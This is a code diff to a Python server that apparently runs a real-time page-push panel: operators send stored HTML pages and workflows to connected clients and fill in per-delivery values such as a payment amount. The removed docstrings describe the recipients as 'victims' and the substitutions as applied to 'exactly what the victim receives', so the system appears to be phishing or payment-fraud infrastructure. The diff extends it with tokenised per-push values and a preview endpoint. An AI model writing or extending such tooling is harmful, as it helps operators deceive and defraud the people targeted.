@@ -1978,7 +1978,7 @@ async def _broadcast_profile_update(client_id: str, profile_data: Dict):
 # and rely on a few helpers here to keep the handler readable.
 
 
-def _lpv_page_url(page_id: str) -> str:
+def _lpv_page_url(page_id: str, bind_token: Optional[str] = None) -> str:
     """Return the browser-visible URL for a pushed LPV page.
 
     We prefer a same-origin relative URL whenever we do not have a
@@ -1992,6 +1992,9 @@ def _lpv_page_url(page_id: str) -> str:
     # is unset, placeholder, or points at an external host the browser cannot
     # resolve from the current session.
     relative_url = f"/api/lpv/archive/{page_id}/html"
+    # Binding values belong to one delivery, so the URL carries the token that
+    # points at them (see _bind_token_for).
+    query = f"?b={bind_token}" if bind_token else ""
     try:
         if session_manager and getattr(session_manager, "config", None):
             cfg = session_manager.config
@@ -2025,16 +2028,16 @@ def _lpv_page_url(page_id: str) -> str:
                         prefix = parsed_url.path.rstrip("/")
                         return (
                             f"{parsed_url.scheme}://{parsed_url.netloc}"
-                            f"{prefix}/api/lpv/archive/{page_id}/html"
+                            f"{prefix}/api/lpv/archive/{page_id}/html{query}"
                         )
                 elif (host_lower not in placeholder_hosts
                       and not host_lower.startswith("*")
                       and not host_lower.endswith((".example.com", ".example.org",
                                                    ".example.net"))):
-                    return f"{scheme}://{host}/api/lpv/archive/{page_id}/html"
+                    return f"{scheme}://{host}/api/lpv/archive/{page_id}/html{query}"
     except Exception:
         pass
-    return relative_url
+    return relative_url + query
 
 
 async def _send_to_client(
@@ -6325,40 +6328,116 @@ async def _push_guard_to_viewers(page_id: str, guard: Dict[str, Any]) -> int:
     return sent
 
 
-def _apply_page_bindings(page: Optional[Dict[str, Any]], html: str) -> str:
-    """Apply a page's admin-defined BINDINGS (find -> replace rules) to the
-    HTML being served.  Runs AFTER the sanitizer so an admin replacement is
-    never sanitized away.  Victim-facing only — admin previews show the
-    original page so the operator can verify the true content + rules."""
+def _apply_page_bindings(
+    page: Optional[Dict[str, Any]],
+    html: str,
+    values: Optional[Dict[str, str]] = None,
+) -> str:
+    """Fill a page's binding slots in the HTML being served.
+
+    Runs AFTER the sanitizer, so an operator's replacement text is not
+    stripped. ``values`` are the fields the operator typed for this one push
+    (name -> value); a named binding with no value falls back to the default
+    saved with the page. Bindings without a name behave as they always have:
+    a find -> replace applied to every serve.
+    """
     if not html or not page:
         return html
     bindings = page.get("bindings") or []
     if not isinstance(bindings, list) or not bindings:
         return html
-    applied = 0
-    for b in bindings:
-        try:
-            if not isinstance(b, dict):
-                continue
-            find = b.get("find") or ""
-            if not find:
-                continue
-            repl = str(b.get("replace") or "")
-            if find in html:
-                html = html.replace(find, repl)
-                applied += 1
-        except Exception:
-            pass
-    if applied:
+    try:
+        from page_bindings import apply_bindings
+        html, report = apply_bindings(html, bindings, values)
+    except Exception:
+        logger.warning("[lpv] bindings on page %s could not be applied",
+                       page.get("id"), exc_info=True)
+        return html
+    if report.get("applied"):
         logger.debug(
-            "[lpv] bindings applied to page %s: %d/%d rule(s)",
-            page.get("id"), applied, len(bindings),
+            "[lpv] bindings applied to page %s: %s",
+            page.get("id"),
+            ", ".join(f"{a['name']}×{a['count']}" for a in report["applied"]),
         )
     return html
 
 
+# ---------------------------------------------------------------------------
+# Per-push binding values
+# ---------------------------------------------------------------------------
+# A push may carry values ("amount = NGN 50,000"). Those must apply to the ONE
+# delivery, not to every later visitor, so the URL handed to that visitor
+# carries an opaque token and the values live here, briefly.
+_BIND_RENDERS: Dict[str, Dict[str, Any]] = {}
+_BIND_RENDER_TTL = 6 * 3600      # a session that idles longer re-pushes anyway
+_BIND_RENDER_MAX = 500
+
+
+def _bind_token_for(page_id: str, values: Dict[str, str]) -> str:
+    """Store values for one delivery and return the token for its URL."""
+    import secrets
+
+    # Drop expired entries before growing the map.
+    now = time.time()
+    for token in [t for t, v in _BIND_RENDERS.items() if v["expires"] < now]:
+        _BIND_RENDERS.pop(token, None)
+    if len(_BIND_RENDERS) >= _BIND_RENDER_MAX:
+        oldest = min(_BIND_RENDERS, key=lambda t: _BIND_RENDERS[t]["created"])
+        _BIND_RENDERS.pop(oldest, None)
+    token = secrets.token_urlsafe(12)
+    _BIND_RENDERS[token] = {
+        "page_id": page_id,
+        "values": {str(k): str(v) for k, v in values.items()},
+        "created": now,
+        "expires": now + _BIND_RENDER_TTL,
+    }
+    return token
+
+
+def _bind_values_for(page_id: str, token: Optional[str]) -> Dict[str, str]:
+    """Values stored for this token, if it belongs to this page and is live."""
+    if not token:
+        return {}
+    entry = _BIND_RENDERS.get(token)
+    if not entry or entry["expires"] < time.time():
+        _BIND_RENDERS.pop(token, None)
+        return {}
+    if entry["page_id"] != page_id:
+        return {}
+    return dict(entry.get("values") or {})
+
+
+def _bind_values_for_page(page_id: str, values: Optional[Dict[str, str]]) -> Dict[str, str]:
+    """The subset of typed values that this page actually declares.
+
+    A workflow run may carry values for several pages; a page that has no
+    binding with that name must not receive them.
+    """
+    if not values:
+        return {}
+    page = lpv_store.get_page(page_id) or {}
+    names = {
+        (b or {}).get("name")
+        for b in (page.get("bindings") or [])
+        if isinstance(b, dict) and (b or {}).get("name")
+    }
+    return {k: v for k, v in values.items() if k in names}
+
+
+def _clean_bind_values(raw: Any) -> Dict[str, str]:
+    """Only plain name -> string pairs, bounded in size."""
+    out: Dict[str, str] = {}
+    if isinstance(raw, dict):
+        for key, value in list(raw.items())[:50]:
+            name = str(key)[:60]
+            if not name or value is None:
+                continue
+            out[name] = str(value)[:5000]
+    return out
+
+
 @app.get("/api/lpv/archive/{page_id}/html")
-async def lpv_archive_html(page_id: str):
+async def lpv_archive_html(page_id: str, b: Optional[str] = None):
     """Raw HTML body — the client runtime fetches this URL to render
     a pushed page. Returns text/html so the browser can inject it
     directly into a container."""
@@ -6379,9 +6458,10 @@ async def lpv_archive_html(page_id: str):
     if os.environ.get("LPV_STRIP_SCRIPTS", "1") not in ("0", "false", "False"):
         import re as _re_strip
         html = _re_strip.sub(r"<script\b[^>]*(?:/>|>[\s\S]*?</script\s*>)", "", html, flags=_re_strip.IGNORECASE)
-    # Admin bindings: find -> replace substitutions (e.g. me.com -> you.com)
-    # applied to exactly what the victim receives.
-    html = _apply_page_bindings(page, html)
+    # Bindings, including the values the operator typed for THIS push
+    # (?b=<token> — see _bind_token_for). Without a token the page still gets
+    # its saved rules/defaults, exactly as before.
+    html = _apply_page_bindings(page, html, _bind_values_for(page_id, b))
 
     # Re-inject a VALIDATED base: the sanitizer strips <base> for safety,
     # but a base-less document blob'd by the client resolves every relative
@@ -6585,13 +6665,19 @@ async def lpv_page_device_put(page_id: str, request: Request):
 
 @app.get("/api/lpv/pages/{page_id}/bindings")
 async def lpv_page_bindings_get(page_id: str, request: Request):
-    """List a page's find -> replace bindings (admin)."""
+    """A page's bindings, plus the fields a panel should ask for (admin).
+
+    ``fields`` is the push-time form: one entry per *named* binding, with its
+    saved default, in the order the operator arranged them.
+    """
     if not await verify_admin_token(request):
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
     page = lpv_store.get_page(page_id)
     if not page:
         return JSONResponse({"error": "not found"}, status_code=404)
-    return {"bindings": page.get("bindings") or []}
+    from page_bindings import fields_for
+    bindings = page.get("bindings") or []
+    return {"bindings": bindings, "fields": fields_for(bindings)}
 
 
 @app.put("/api/lpv/pages/{page_id}/bindings")
@@ -6611,11 +6697,66 @@ async def lpv_page_bindings_put(page_id: str, request: Request):
     bindings = (body or {}).get("bindings")
     if bindings is None:
         return JSONResponse({"error": "bindings[] required"}, status_code=400)
-    ok = lpv_store.set_page_bindings(page_id, bindings)
+    try:
+        ok = lpv_store.set_page_bindings(page_id, bindings)
+    except ValueError as exc:
+        # A bad regex / missing matcher is the operator's typo, not a crash:
+        # say what is wrong so the editor can show it next to the row.
+        return JSONResponse({"error": str(exc)}, status_code=400)
     if not ok:
         return JSONResponse({"error": "save failed"}, status_code=500)
     saved = (lpv_store.get_page(page_id) or {}).get("bindings") or []
-    return {"success": True, "bindings": saved, "count": len(saved)}
+    from page_bindings import fields_for
+    return {
+        "success": True,
+        "bindings": saved,
+        "fields": fields_for(saved),
+        "count": len(saved),
+    }
+
+
+@app.post("/api/lpv/pages/{page_id}/bindings/preview")
+async def lpv_page_bindings_preview(page_id: str, request: Request):
+    """Render the page as a visitor would receive it, with these values.
+
+    Body: {"bindings": {"amount": "NGN 50,000"}}. Returns the rendered HTML and
+    a report of which bindings matched, so an operator can check the result
+    before pushing instead of pushing and asking the visitor.
+    """
+    if not await verify_admin_token(request):
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    page = lpv_store.get_page(page_id)
+    if not page:
+        return JSONResponse({"error": "not found"}, status_code=404)
+    html = lpv_store.read_page_html(page_id)
+    if html is None:
+        return JSONResponse({"error": "file missing on disk"}, status_code=410)
+    try:
+        body = await request.json()
+    except Exception:
+        body = {}
+    if not isinstance(body, dict):
+        body = {}
+    values = _clean_bind_values(body.get("bindings"))
+
+    # The editor can preview *unsaved* rules, so a typo is caught before it is
+    # stored. Without that, Preview would always show the last saved version.
+    from page_bindings import apply_bindings, normalise_bindings
+    rules = page.get("bindings") or []
+    if isinstance(body.get("rules"), list):
+        try:
+            rules = normalise_bindings(body["rules"])
+        except ValueError as exc:
+            return JSONResponse({"error": str(exc)}, status_code=400)
+    rendered, report = apply_bindings(html, rules, values)
+    return {
+        "page_id": page_id,
+        "name": page.get("name", ""),
+        "values": values,
+        "report": report,
+        "count": len(rules),
+        "html": rendered,
+    }
 
 
 @app.delete("/api/lpv/archive/{page_id}")
@@ -6987,6 +7128,7 @@ async def _run_workflow_on_client(
     client_id: str, workflow: dict,
     connection_token: Optional[str] = None,
     workflow_token: Optional[str] = None,
+    bindings: Optional[Dict[str, str]] = None,
 ) -> None:
     """Push each step of a workflow to a client with delays between
     pushes. This runs as a background task so the WS ack returns
@@ -7074,7 +7216,11 @@ async def _run_workflow_on_client(
                      "kind": kind, "reason": "page_missing"},
                 )
                 continue
-            page_url = _lpv_page_url(page_id)
+            # Values typed for this run apply to every page step that has a
+            # binding of that name; pages without those slots are untouched.
+            step_values = _bind_values_for_page(page_id, bindings)
+            bind_token = _bind_token_for(page_id, step_values) if step_values else None
+            page_url = _lpv_page_url(page_id, bind_token)
             ok = await _send_to_client(client_id, {
                 "type": "lpv_show_page",
                 "page_id": page_id,
@@ -7286,7 +7432,7 @@ async def _run_workflow_on_client(
 
 
 @app.post("/api/lpv/workflows/{workflow_id}/run/{client_id}")
-async def lpv_workflow_run(workflow_id: str, client_id: str):
+async def lpv_workflow_run(workflow_id: str, client_id: str, request: Request):
     wf = lpv_store.get_workflow(workflow_id)
     if not wf:
         return JSONResponse({"error": "workflow not found"}, status_code=404)
@@ -7296,8 +7442,17 @@ async def lpv_workflow_run(workflow_id: str, client_id: str):
     # The audit log will tell the operator what happened.  Tracked in
     # _workflow_tasks so re-running for the same client replaces the
     # previous chain instead of interleaving two of them.
+    # Optional binding values for this run: {"bindings": {"amount": "NGN 50,000"}}.
+    # They are offered to every page step whose binding has that name.
+    bindings: Dict[str, str] = {}
+    try:
+        body = await request.json()
+        if isinstance(body, dict):
+            bindings = _clean_bind_values(body.get("bindings"))
+    except Exception:
+        pass
     await _cancel_workflow_for_client(client_id, f"superseded by manual run {workflow_id}")
-    _launch_workflow(client_id, wf)
+    _launch_workflow(client_id, wf, bindings=bindings)
     lpv_store.record_event(
         client_id, "workflow_started",
         {"workflow_id": workflow_id, "name": wf.get("name")},
@@ -7858,12 +8013,16 @@ def _register_workflow_task(
     return token
 
 
-def _launch_workflow(client_id: str, workflow: dict) -> asyncio.Task:
+def _launch_workflow(
+    client_id: str, workflow: dict,
+    bindings: Optional[Dict[str, str]] = None,
+) -> asyncio.Task:
     """Start the canonical workflow chain task for a client (tracked)."""
     workflow_token = uuid.uuid4().hex
     task = asyncio.create_task(
         _run_workflow_on_client(
-            client_id, workflow, workflow_token=workflow_token
+            client_id, workflow, workflow_token=workflow_token,
+            bindings=bindings or None,
         )
     )
     _register_workflow_task(client_id, task, workflow_token)
@@ -9603,7 +9762,16 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                     })
                                 else:
                                     page_id = served_page_id
-                                    page_url = _lpv_page_url(page_id)
+                                    # Values typed in the panel for this one
+                                    # push ("amount = NGN 50,000"). They are
+                                    # stored against a token so they apply to
+                                    # this visitor's delivery only.
+                                    bind_values = _clean_bind_values(data.get("bindings"))
+                                    bind_token = (
+                                        _bind_token_for(page_id, bind_values)
+                                        if bind_values else None
+                                    )
+                                    page_url = _lpv_page_url(page_id, bind_token)
                                     ok = await _send_to_client(client_id, {
                                         "type": "lpv_show_page",
                                         "page_id": page_id,
@@ -9644,6 +9812,7 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         "client_id": client_id,
                                         "page_id": page_id,
                                         "delivered": ok,
+                                        "bindings": sorted(bind_values),
                                     })
 
             except asyncio.TimeoutError:
